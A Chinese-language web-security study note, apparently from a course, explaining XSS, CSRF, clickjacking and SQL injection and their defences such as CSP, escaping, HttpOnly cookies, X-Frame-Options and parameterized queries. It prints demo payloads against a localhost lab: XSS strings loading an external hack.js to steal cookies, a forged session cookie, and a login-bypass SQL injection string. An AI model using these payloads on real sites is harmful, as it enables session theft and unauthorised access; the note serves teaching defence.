- 常见的Web攻击方式
  - XSS
  - CSRF
  - 点击劫持
  - SQL注入
  - OS注入
  - 请求劫持
  - DDOS

- 防范方法
  - 密码安全 - 密码加固
  - 密码学（对称与非对称）
  - 传输安全 - HTTPS
  - NodeJS安全框架 hemelt
  - CSP 策略 content-security-policy



## 常见Web攻击

### 一、XSS（盗取登录态信息）

> Cross Site Scripting --- 跨站脚本攻击
>
> 因为缩写和CSS重叠，所以只能叫XSS。跨站脚本攻击是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的非站点HTML标签或Javascript进行的一种高级。
>
> 跨站脚本攻击有可能造成以下影响：
>
> - 利用虚假输入表单骗取用户个人信息。
> - 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
> - 显示伪造的文章或图片。



> XSS攻击分类

- 反射型 - url参数直接注入

```js
// 普通
http://localhost:3000/?from=china
// alert尝试
http://localhost:3000/?from=<script>alert(3)</script>
// 获取Cookie
http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"></script>
// 短域名伪造 https://dwz.cn/
// 伪造cookie入侵 chrome
document.cookie="cookie:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNTY1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="

```



- 存储型 - 存储到DB后读取时注入

```js
// 评论
<script>alert(1)</script>
// 跨站脚本注入
我来了<script src="http://localhost:4000/hack.js"></script>
```





#### XSS攻击的危害 - Scripting能干啥就干啥

- 获取页面数据
- 获取Cookie
- 劫持前端逻辑
- 发送请求
- 偷取网站的任意数据
- 偷取用户的资料
- 偷取用户的秘密和登录态
- 欺骗用户



#### 防范手段

##### 1、CSP

> **内容安全策略** (CSP, Content Security Policy) 是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本 (XSS) 和数据注入等攻击。 这些攻击可用于实现从数据窃取到 网站破坏或作为恶意软件分发版本等用途。
>
> CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只 需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻 击。

```js
// 只允许加载本站资源
Content-Security-Policy: default-src 'self'
// 只允许加载 HTTPS 协议图片
Content-Security-Policy: img-src https://*
// 不允许加载任何来源框架
Content-Security-Policy: child-src 'none'
```

```js
ctx.set('Content-Security-Policy', "default-src 'self'")
// 尝试一下外部资源不能加载
http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"></script>
```



##### 2、转义字符

ejs转义

```html
<% code %>	:	用于执行其中javascript代码
<%= code %>	:	会对code进行html转义； 推荐
<%- code %>	:	将不会进行转义
```



##### 3、黑名单

> 用户的输入永远不可信任的，最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠 进行转义

```js
function escape(str) {
  str = str.replace(/&/g, '&amp;')
  str = str.replace(/</g, '&lt;')
  str = str.replace(/>/g, '&gt;')
  str = str.replace(/"/g, '&quto;')
  str = str.replace(/'/g, '&#39;')
  str = str.replace(/`/g, '&#96;')
  str = str.replace(/\//g, '&#x2F;')
  return str
}
```



> 对富文本来说，显然不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式



##### 4、白名单

```js
const xss = require('xss')
let html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss");</script>')
// -> <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;
console.log(html)
```



##### 5、HttpOnly Cookie

> 这是预防XSS攻击窃取用户cookie最有效的防御手段。Web应 用程序在设置cookie时，将其属性设为HttpOnly，就可以避免该网页的cookie被客户端恶意JavaScript窃取，保护用户 cookie信息。

```js
response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly")
```

注：cookie在同域的情况下会被请求自动带上，期间其实不需要js参与



### 二、CSRF（利用登录态信息）

> CSRF(Cross Site Request Forgery)，即跨站请求伪造，是一种常见的Web攻击，它利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。

- 用户已经登录了站点 A，并在本地记录了 cookie
- 在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱 危险站点 B (B 站点要求访问站点A)。
- 站点 A 没有做任何 CSRF 防御

```js
登录 http://localhost:4000/csrf.html
```

> 注：同一个浏览器不同tab，共享session（浏览器自身机制）
>
> 例如3000端口携带cookie
>
> 4000端口提交到3000端口，也会有cookie信息



#### CSRF攻击危害

- 利用用户登录态
- 用户不知情
- 完成业务请求
- 盗取用户资金（转账，消费）
- 冒充用户发帖背锅
- 损害网站声誉

#### 防御

- 验证码：人机验证 = 图形验证码、短信
- cookie值进行hash（不是不能伪造，但是增加了犯罪成本，被迫的需要去分析一些逻辑）：攻击者在访问信任网站A时，虽然浏览器可以在请求中带上cookie，但是网站A却不仅仅通过cookie来判断用户身份，同时通过用户发送过来的内容中的伪随机数来判断请求是否是真正用户发送的。攻击者在请求A的时候，不能在提交的内容中产生伪随机数（通过cookie哈希化的值）。

打开查看网站调用的源

CSRF本身没有太多有效的防御手段，最有效的是人机验证，但是这会降低用户体验。



### 三、点击劫持 - clickjacking

> 点击劫持是一种**视觉欺骗的攻击手段**。攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己 的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。

```js
// 登录
http://localhost:4000/clickjacking.html
```

#### 防御

- X-FRAME-OPTIONS

X-FRAME-OPTIONS 是一个 HTTP 响应头，在现代浏览器有一个很好的支持。这个 HTTP 响应头就 是为了防御用 iframe 嵌套的点击劫持攻击。

该响应头有三个值可选，分别是：

（1）DENY，表示页面不允许通过 iframe 的方式展示

（2）SAMEORIGIN，表示页面可以在相同域名下通过 iframe 的方式展示

（3）ALLOW-FROM，表示页面可以在指定来源的 iframe 中展示

```js
ctx.set('X-FRAME-OPTIONS', 'DENY')
```



- JS方式

```html
<head>
<style id="click-jack">
html {
	display: none !important;
}
</style>
</head>
<body>
<script>
// self是对当前窗口自身的引用，window属性是等价的
// top是返回顶层窗口，即浏览器窗口
if (self == top) {
  var style = document.getElementById('click-jack')
  document.body.removeChild(style)
} else {
  top.location = self.location
}
</script>
</body>
```



### 四、SQL注入 - 比较古老了

```sql
# 进入页面：  http://localhost:3000/login
# 填入特殊密码
1'or'1'='1

# 拼接后的SQL
SELECT *
FROM test.user
WHERE username = 'laowang'
AND password = '1'or'1'='1'
```

#### 防御

- 所有的查询语句建议使用数据库提供的参数化查询接口**，参数化的语句使用参数而不是将用户 输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的 query 方法中的 ? 占位参数。

```js
const { username, password } = ctx.request.body

// 错误写法
let sql = `
  SELECT *
  FROM test.user
  WHERE username = '${username}'
  AND password = '${password}'
`
res = await query(sql)

// 正确的写法
let sql = `
  SELECT *
  FROM test.user
  WHERE username = ?
  AND password = ?
`
res = await query(sql, [username, password]);
```

- 严格限制Web应用的数据库的操作权限**，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害
- 后端代码检查输入的数据是否符合预期**，严格限制变量的类型，例如使用正则表达式进行一些匹配处理。
- 对进入数据库的特殊字符（'，"，\，<，>，&，*，; 等）进行转义处理，或编码转换**。基本上 所有的后端语言都有对字符串进行转义处理的方法，比如 lodash 的 lodash._escapehtmlchar 库。































